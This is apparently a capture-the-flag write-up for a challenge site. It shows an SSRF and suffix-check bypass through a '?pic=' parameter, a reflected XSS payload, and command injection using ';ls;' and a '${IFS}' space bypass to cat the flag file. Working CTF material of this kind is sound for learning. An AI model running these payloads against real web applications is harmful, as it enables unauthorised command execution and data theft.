# <ins>Explain</ins>

## General Info
<b>Server:</b> Apache/2.4.25  
<b>X-Powered-By:</b> PHP/5.6.40  
<b>Running On:</b> amazon aws  
it's also using load balancer of amazon,  
and fetching his url requests using curl version 7.52.1

I used requestbin to capture the url requests.



## Exploit

1) this site is vulnerable to url redirect via the ?pic= parameter.  
<b>POC:</b> http://gifon.shieldchallenges.com/?pic=http%3A%2F%2F10.10.10.3%2Fdani.gif.  
this will fetch the picture dani.gif from the website 10.10.10.3 and show it to us.
(however this exploit has restriction that the url must start with <b>http://</b> (to prevent access to local files) and must end with <b>.gif</b>  

2) I managed to bypass it using a query parameter.  
<b>POC:</b> http://gifon.shieldchallenges.com/?pic=http%3A%2F%2F10.10.10.3%2F?param=dani.gif.  
this will fetch for the url http://10.10.10.3 and if it has picture it will render it using the \<img> tag.

3) this site is vulnerable to ssrf attack because when we use the url redirect using the ?pic= parameter,   
we can see the we get 2  requests if we trace them (for example with requestbin).
one from the server and one from my browser client.  
we can also see the headers we get from the web server, from that we can assume it is using curl version 7.52.1

4) using a web crawler like gobuster we found a very suspicious url on the server that we did not have access to.  
this url is http://gifon.shieldchallenges.com/secret.  
when we try to get there we get error 403 (permission denied).  
I am pretty sure this is where our flag.

5) this website is also vulnerable to xss via specially crafted url.  
<b>POC:</b> http://gifon.shieldchallenges.com/?pic=http%3A%2F%2Fx%27%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E.gif

6) <ins>maybe a thing:</ins>  
when I tried to set the referer header to 'http://gifon.shieldchallenges.com/secret' and the pic parameter to 'http://gifon.shieldchallenges.com/secret' it showed another response than ususal

6) this site is vulnerable to command injection  
<b>POC:</b> 'http://gifon.shieldchallenges.com/?pic=http%3A%2F%2F;ls;?name=.gif'  
this will show you all the files in the directory.
because we can not use whitespaces we need to trick the website.
so the solution is like this:  
<b>POC:</b> 'http://gifon.shieldchallenges.com/?pic=http%3A%2F%2F;cat${IFS}./secret/flag;?name=.gif'.  
<b> and we got our flag!! </b>
